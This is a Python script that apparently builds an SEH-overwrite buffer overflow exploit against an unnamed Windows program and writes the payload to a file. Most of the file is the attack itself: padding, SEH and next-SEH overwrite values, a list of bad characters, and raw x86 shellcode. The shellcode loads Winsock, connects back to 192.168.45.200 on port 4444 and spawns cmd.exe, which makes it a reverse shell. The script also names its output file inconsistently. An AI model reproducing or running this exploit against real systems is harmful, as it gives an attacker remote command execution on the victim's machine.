import struct

# Total required characters
req_chars = 65572


#badchars -> 0a, 0b,0d

segment1 = b"\x41" * 10004
segment1 += struct.pack("<L", 0x90900ceb)
segment1 += struct.pack("<L", 0x1204be6f)  # SEH1 overwrite
#1204be70 

#segment1 += bad_chars

segment1 += b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"

shellcode = b"\x89\xe5\x81\xc4\xf0\xf9\xff\xff\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x5e\x08\x8b\x7e\x20\x8b\x36\x66\x39\x4f\x18\x75\xf2\x74\x06\x5e\x89\x75\x04\x74\x5f\xe8\xf5\xff\xff\xff\x60\x8b\x43\x3c\x8b\x7c\x03\x78\x01\xdf\x8b\x4f\x18\x8b\x47\x20\x01\xd8\x89\x45\xfc\xe3\x41\x49\x8b\x45\xfc\x8b\x34\x88\x01\xde\x31\xc0\x99\xfc\xac\x84\xc0\x74\x12\x50\x51\x31\xc9\x80\xc1\x06\x80\xc1\x07\xd3\xca\x59\x58\x01\xc2\x75\xe9\x3b\x54\x24\x24\x75\xd4\x8b\x57\x24\x01\xda\x66\x8b\x0c\x4a\x8b\x57\x1c\x01\xda\x8b\x04\x8a\x01\xd8\x89\x44\x24\x1c\x61\xc3\x68\x83\xb9\xb5\x78\xff\x55\x04\x89\x45\x10\x68\x8e\x4e\x0e\xec\xff\x55\x04\x89\x45\x14\x68\x72\xfe\xb3\x16\xff\x55\x04\x89\x45\x18\x31\xc0\x66\xb8\x6c\x6c\x50\x68\x33\x32\x2e\x64\x68\x77\x73\x32\x5f\x54\xff\x55\x14\x89\xc3\x68\xcb\xed\xfc\x3b\xff\x55\x04\x89\x45\x1c\x68\xd9\x09\xf5\xad\xff\x55\x04\x89\x45\x20\x68\x0c\xba\x2d\xb3\xff\x55\x04\x89\x45\x24\x89\xe0\x66\xb9\x90\x05\x29\xc8\x50\x31\xc0\x66\xb8\x02\x02\x50\xff\x55\x1c\x31\xc0\x50\x50\x50\xb0\x06\x50\x2c\x05\x50\x40\x50\xff\x55\x20\x89\xc6\x31\xc0\x50\x50\x68\xc0\xa8\x2d\xc8\x66\xb8\x11\x5c\xc1\xe0\x10\x66\x83\xc0\x02\x50\x54\x5f\x31\xc0\x50\x50\x50\x50\x04\x10\x50\x57\x56\xff\x55\x24\x56\x56\x56\x31\xc0\x50\x50\xb0\x80\x31\xc9\xb1\x80\x01\xc8\x50\x31\xc0\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50\xb0\x44\x50\x54\x5f\xb8\x9b\x87\x9a\xff\xf7\xd8\x50\x68\x63\x6d\x64\x2e\x54\x5b\x89\xe0\x31\xc9\x66\xb9\x90\x03\x29\xc8\x50\x57\x31\xc0\x50\x50\x50\x40\x50\x48\x50\x50\x53\x50\xff\x55\x18\x31\xc9\x51\x6a\xff\xff\x55\x10"
#custom_reverse_shellcode
segment1 +=shellcode


segment2 = b"\x42" * (30284 - len(segment1))
segment2 += struct.pack("<L", 0x41414141)  # NSEH2 overwrite
segment2 += struct.pack("<L", 0x42424242)  # SEH2 overwrite

segment3 = b"\x43" * (50564 - len(segment1) - len(segment2))
segment3 += struct.pack("<L", 0x43434343)  # NSEH3 overwrite
segment3 += struct.pack("<L", 0x44444444)  # SEH3 overwrite

# Combine the segments
combines = segment1 + segment2 + segment3


if len(combines) < req_chars:
    combines += b"\x43" * (req_chars - len(combines))
elif len(combines) > req_chars:
    combines = combines[:req_chars]


segment1_len = len(segment1)
segment2_len = len(segment2)
segment3_len = len(segment3)
total_len = len(combines)

print("segment1 len: %d" % segment1_len)
print("segment2 len: %d" % segment2_len)
print("segment3 len: %d" % segment3_len)
print("Total length: %d" % total_len)

if total_len == req_chars:
    print("The combined payload length is correct.")
else:
    print("The combined payload length is incorrect.")

with open("payloadb.txt", "wb") as file:
    file.write(combines)

print("Payload written to payload.txt")
